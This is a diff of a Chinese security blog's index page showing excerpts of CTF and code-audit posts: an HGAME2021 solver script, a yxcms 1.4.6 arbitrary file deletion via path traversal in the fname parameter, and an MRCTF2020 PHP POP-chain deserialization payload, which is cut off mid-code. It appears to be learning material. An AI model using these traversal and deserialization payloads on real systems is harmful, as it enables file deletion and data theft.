@@ -156,142 +156,57 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-php变量覆盖" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-php原生类操作文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/13/php变量覆盖/">php变量覆盖</a>
+      <a class="article-title" href="/2021/04/07/php原生类操作文件/">php原生类操作文件</a>
     </h1>
   
 
         
-        <a href="/2020/03/13/php变量覆盖/" class="archive-article-date">
-  	<time datetime="2020-03-13T04:53:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-13</time>
+        <a href="/2021/04/07/php原生类操作文件/" class="archive-article-date">
+  	<time datetime="2021-04-07T02:31:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-07</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。</p>
-<p>经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数等.</p>
-        
-          <a class="article-more-a" href="/2020/03/13/php变量覆盖/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/03/13/php变量覆盖/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-正则表达式笔记“" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/01/正则表达式笔记“/">正则表达式笔记“ </a>
-    </h1>
-  
-
-        
-        <a href="/2020/03/01/正则表达式笔记“/" class="archive-article-date">
-  	<time datetime="2020-03-01T07:30:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><table>
+        <h2 id="标准库（spl）"><a href="#标准库（spl）" class="headerlink" title="标准库（spl）"></a>标准库（spl）</h2><p>SPL就是Standard PHP Library的缩写。据手册显示，SPL是用于解决<code>典型问题(standard problems)</code>的一组接口与类的集合。里边有一些处理文件的类</p>
+<table>
 <thead>
 <tr>
-<th>特殊字符</th>
-<th>描述</th>
+<th align="left">类</th>
+<th></th>
 </tr>
 </thead>
 <tbody><tr>
-<td>$</td>
-<td>匹配输入字符串的结尾位置</td>
+<td align="left">DirectoryIterator</td>
+<td>遍历目录</td>
 </tr>
 <tr>
-<td>()</td>
-<td>标记一个子表达式的开始和结束位置</td>
+<td align="left">FilesystemIterator</td>
+<td>遍历目录</td>
 </tr>
 <tr>
-<td>*</td>
-<td>匹配前面的子表达式零次或者多次</td>
+<td align="left">GlobIterator</td>
+<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
 </tr>
 <tr>
-<td>+</td>
-<td>匹配前面的子表达式一次或多次</td>
+<td align="left">SplFileObject</td>
+<td>读取文件，按行读取，多行需要遍历</td>
 </tr>
 <tr>
-<td>.</td>
-<td>匹配除\n换行符之外的任何字符</td>
-</tr>
-<tr>
-<td>[</td>
-<td>标记一个中括号表达式的开始</td>
-</tr>
-<tr>
-<td>？</td>
-<td>匹配前面的子表达式的零次或者一次，或指明一个非贪婪限定符</td>
-</tr>
-<tr>
-<td>^</td>
-<td>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合</td>
-</tr>
-<tr>
-<td>{</td>
-<td>标记限定符表达式的开始</td>
-</tr>
-<tr>
-<td>|</td>
-<td>指明两项之间的一个选择，即“或”</td>
+<td align="left">finfo/finfo_open()</td>
+<td>需要两个参数</td>
 </tr>
 </tbody></table>
         
-          <a class="article-more-a" href="/2020/03/01/正则表达式笔记“/#more">more >></a>
+          <a class="article-more-a" href="/2021/04/07/php原生类操作文件/#more">more >></a>
         
       
 
@@ -304,7 +219,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/03/01/正则表达式笔记“/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/04/07/php原生类操作文件/">展开全文 >></a>
         </p>
       
 
@@ -334,30 +249,38 @@
 
 
   
-    <article id="post-xss入门" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-HGAME2021" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/27/xss入门/">xss入门</a>
+      <a class="article-title" href="/2021/02/01/HGAME2021/">HGAME2021</a>
     </h1>
   
 
         
-        <a href="/2020/02/27/xss入门/" class="archive-article-date">
-  	<time datetime="2020-02-27T02:21:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-27</time>
+        <a href="/2021/02/01/HGAME2021/" class="archive-article-date">
+  	<time datetime="2021-02-01T10:54:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="xss入门"><a href="#xss入门" class="headerlink" title="xss入门"></a>xss入门</h1><h2 id="什么是xss攻击"><a href="#什么是xss攻击" class="headerlink" title="什么是xss攻击"></a>什么是xss攻击</h2><p>xss跨站脚本攻击，是指攻击者通过巧妙的方法将一段脚本内容放入到网页，使用户加载并执行攻击者恶意制造的网页程序。</p>
-        
-          <a class="article-more-a" href="/2020/02/27/xss入门/#more">more >></a>
-        
+        <h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>打开题目，让做定积分的题，并且做够100道才给flag，很明显需要用脚本跑；</p>
+<p>先分析过程：</p>
+<p>打开f12,看网络</p>
+<p><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210201185918.png" alt></p>
+<p>访问/static/js/fuckmath.js，注意到里边有几个功能函数，getstadus，getquestion，getflag，分析代码，当solving为100时，会调用getflag函数；</p>
+<p><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210201190405.png" alt></p>
+<p>先计算出第一个定积分的答案，然后提交数据，抓包整理过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index-&gt;vetify-&gt;getquestion-&gt;getstatus</span><br></pre></td></tr></table></figure>
+
+<p>本来以为主页面会有一个提交数据的地方给vetify，但是没有找到，只能构造请求头，伪造从index到vetify，直接请求vetify;</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://r4u.top:5000/api/getQuestion'</span></span><br><span class="line">response = requests.get(url=url)</span><br><span class="line">cookie_value = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> response.cookies.items():</span><br><span class="line">    cookie_value += key + <span class="string">'='</span> + value + <span class="string">';'</span></span><br><span class="line">print(cookie_value)</span><br><span class="line">j=<span class="number">-1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;<span class="number">100</span>:</span><br><span class="line">    <span class="keyword">if</span> j!=<span class="number">-1</span>:</span><br><span class="line">        print(j)</span><br><span class="line">        url1 = <span class="string">'http://r4u.top:5000/api/verify'</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'answer'</span>: float(res)</span><br><span class="line">        &#125;</span><br><span class="line">        response1 = requests.post(url=url1, headers=header, json=data)</span><br><span class="line">        html1 = response1.text</span><br><span class="line">        print(html1)</span><br><span class="line">        cookie_value = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> response1.cookies.items():</span><br><span class="line">            cookie_value += key + <span class="string">'='</span> + value + <span class="string">';'</span></span><br><span class="line">        <span class="comment">##print(cookie_value)</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'r4u.top:5000'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span>,</span><br><span class="line">            <span class="string">'Cache'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">            <span class="string">'Content-Length'</span>: <span class="string">'12'</span>,</span><br><span class="line">            <span class="string">'Origin'</span>: <span class="string">'http://r4u.top:5000'</span>,</span><br><span class="line">            <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://r4u.top:5000/'</span>,</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie_value</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">##print(header)</span></span><br><span class="line">        response = requests.get(url=url, headers=header)</span><br><span class="line">    <span class="keyword">if</span> j!=<span class="number">99</span>:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'r4u.top:5000'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span>,</span><br><span class="line">            <span class="string">'Cache'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">            <span class="string">'Content-Length'</span>: <span class="string">'12'</span>,</span><br><span class="line">            <span class="string">'Origin'</span>: <span class="string">'http://r4u.top:5000'</span>,</span><br><span class="line">            <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://r4u.top:5000/'</span>,</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie_value</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.get(url=url, headers=header)</span><br><span class="line">        html = response.text</span><br><span class="line">        pattern1 = <span class="string">'&lt;mo&gt;.?&lt;/mo&gt;'</span></span><br><span class="line">        pattern2 = <span class="string">'&lt;mn&gt;[0-9]+&lt;/mn&gt;'</span></span><br><span class="line">        html = response.text</span><br><span class="line">        fuhao = re.findall(pattern1, html)[<span class="number">0</span>]</span><br><span class="line">        fuhao = fuhao[<span class="number">4</span>]</span><br><span class="line">        print(fuhao, end=<span class="string">' '</span>)</span><br><span class="line">        shuju = re.findall(pattern2, html)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="number">4</span>:</span><br><span class="line">            shuju[i] = re.sub(<span class="string">'&lt;mn&gt;|&lt;/mn&gt;'</span>, <span class="string">''</span>, shuju[i])</span><br><span class="line">            print(shuju[i], end=<span class="string">' '</span>)</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        a = int(shuju[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> fuhao == <span class="string">'-'</span>:</span><br><span class="line">            a = -a</span><br><span class="line">        b = int(shuju[<span class="number">1</span>])</span><br><span class="line">        c = int(shuju[<span class="number">2</span>])</span><br><span class="line">        d = int(shuju[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">        x = symbols(<span class="string">'x'</span>)</span><br><span class="line">        res = integrate(c * x + d, (x, a, b))</span><br><span class="line">        print(res)</span><br><span class="line"></span><br><span class="line">    j = j + <span class="number">1</span></span><br><span class="line"><span class="comment">## 答对100道题后获取flag</span></span><br><span class="line">url2=<span class="string">'http://r4u.top:5000/api/getFlag'</span></span><br><span class="line">response2=requests.get(url=url2,headers=header)</span><br><span class="line">print(response2 .text)</span><br></pre></td></tr></table></figure>
       
 
       
@@ -369,7 +292,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/27/xss入门/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/02/01/HGAME2021/">展开全文 >></a>
         </p>
       
 
@@ -399,34 +322,29 @@
 
 
   
-    <article id="post-sql宽字节注入学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-代码审计之yxcms1-4-6" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/17/sql宽字节注入学习/">sql宽字节注入学习</a>
+      <a class="article-title" href="/2021/01/26/代码审计之yxcms1-4-6/">代码审计之yxcms1.4.6</a>
     </h1>
   
 
         
-        <a href="/2019/11/17/sql宽字节注入学习/" class="archive-article-date">
-  	<time datetime="2019-11-17T02:26:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-17</time>
+        <a href="/2021/01/26/代码审计之yxcms1-4-6/" class="archive-article-date">
+  	<time datetime="2021-01-26T08:48:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-26</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>首先了解下宽字节注入，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入</p>
-<p>原理：</p>
-<p>GBK 占用两字节</p>
-<p>ASCII占用一字节</p>
-<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。<br>mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p>
-        
-          <a class="article-more-a" href="/2019/11/17/sql宽字节注入学习/#more">more >></a>
-        
+        <h2 id="filesController-ph处任意文件删除"><a href="#filesController-ph处任意文件删除" class="headerlink" title="filesController.ph处任意文件删除"></a>filesController.ph处任意文件删除</h2><p>文件：protected\apps\admin\controller\filesController.php<br>在filesController.php文件的52-61行中，<br>其中文件路径$dirs拼接了in($_GET[‘fname’]),然后在第57行-59行中对拼接后的路径进行判断，如果是文件目录便执行del_dir方法，如果是文件便执行unlink函数删除文件。<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210126165436.png" alt><br>先看下从get的fname到$dirs之间进行了什么过滤和处理；<br>首先调用了in方法，在common.function.php的第8-23行，跟进in函数内；<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210126165646.png" alt><br>代码中对传入的数据进行htmlspecialchars和addslashes处理，但是并不会对../进行处理。<br>然后出来，跟进del_dir方法，在common.function.php的第421-436行中，代码时先对目录中的文件进行删除，若目录中仍有目录，则递归执行del_dir方法，最后再删除文件目录；<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210126170049.png" alt><br>由于过滤不太严格，存在任意文件删除；<br>例如：</p>
+<pre><code>http://127.0.0.1/yxcms/index.php?r=admin/files/del&amp;fname=/../1.txt    //可以删除和upload同目录下的1.txt文件</code></pre><h2 id="linkController-php任意文件删除"><a href="#linkController-php任意文件删除" class="headerlink" title="linkController.php任意文件删除"></a>linkController.php任意文件删除</h2><p>文件：\protected\apps\admin\controller\linkController.php<br><img src="https://gitee.com/hmanl0u/picgo/raw/master/20210126181949.png" alt></p>
+
       
 
       
@@ -438,7 +356,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/17/sql宽字节注入学习/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/01/26/代码审计之yxcms1-4-6/">展开全文 >></a>
         </p>
       
 
@@ -468,30 +386,44 @@
 
 
   
-    <article id="post-PHP-session反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-反序列化之pop链" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/03/PHP-session反序列化/">PHP session反序列化</a>
+      <a class="article-title" href="/2021/01/25/反序列化之pop链/">反序列化之pop链</a>
     </h1>
   
 
         
-        <a href="/2019/11/03/PHP-session反序列化/" class="archive-article-date">
-  	<time datetime="2019-11-03T06:03:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-03</time>
+        <a href="/2021/01/25/反序列化之pop链/" class="archive-article-date">
+  	<time datetime="2021-01-25T09:48:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-25</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。</p>
-        
-          <a class="article-more-a" href="/2019/11/03/PHP-session反序列化/#more">more >></a>
-        
+        <h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><p>简单的序列化攻击是因为对魔术方法的自动调用而触发漏洞，但如果关键代码不在魔术方法，而是在一个类的普通方法中，则需要观察联系类与函数之间的关系，将其与魔术方法的利用结合起来，这时候就可以利用pop链的构造与攻击。</p>
+<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用到的魔术方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct   当一个对象创建时被调用，</span><br><span class="line">__toString   当一个对象被当作一个字符串被调用。</span><br><span class="line">__wakeup()   使用unserialize时触发</span><br><span class="line">__get()    __get()方法将在访问不存在的成员变量时触发，如此处Test-&gt;var。</span><br><span class="line">__invoke()   对象本身是不能够当做函数去使用的，一旦被当做函数使用，就会回调执行__invoke()方法</span><br></pre></td></tr></table></figure>
+
+<p>题目给出了falg在哪，并且提示使用pop链。</p>
+<p>首先寻找pop链的开端，在Modifier类中的append方法中发现include函数，先搞明白我最终要的结果是什么。<br>要用到append这个方法，并且让$value等于flag.php。<br>继续寻找，在<code>__invoke</code>中调用了append方法，并且$var为参数；然后考虑如何能触发<code>__invoke</code>这个魔术方法；<br>在Test类的__get方法中，发现$function();</p>
+<pre><code>public function __get($key){
+        $function = $this-&gt;p;
+        return $function();
+    }</code></pre><p>只要使$this-&gt;p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的<code>__invoke()</code>方法。<br>然后寻找触发<code>__get</code>的地方；<br>在Show类中，<code>__wakeup()</code>方法中，通过preg_match()将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是Show类，就调用了<code>__toString()</code>方法；tostring方法会返回$this-&gt;str-&gt;source，把赋值$this-&gt;str为一个Test类，test类中没有source参数，然后就会触发<code>__get</code>方法。</p>
+<p>把逻辑梳理一下：<br>实例化一个Show类，会调用<code>__wakeup()</code>,如果实例化的时候能传入一个show类，就能触发<code>__tostring()</code>方法，str实例化成一个没有source属性的类，进而触发<code>__get()</code>,让$p也实例化Modifier类，这样触发<code>__get()</code>之后，$function()就能到Modifier类，从而触发<code>__invoke()</code>.</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier&#123;</span><br><span class="line">    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str=new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hack=new Show();</span><br><span class="line">$hack-&gt;source=new Show();         ////因为我们要传入$file=一个类 这样$this-&gt;source=$file之后 在正则过滤时 就是一个类被当作字符串对待 触发__toString</span><br><span class="line">$hack-&gt;source-&gt;str-&gt;p=new Modifier();</span><br><span 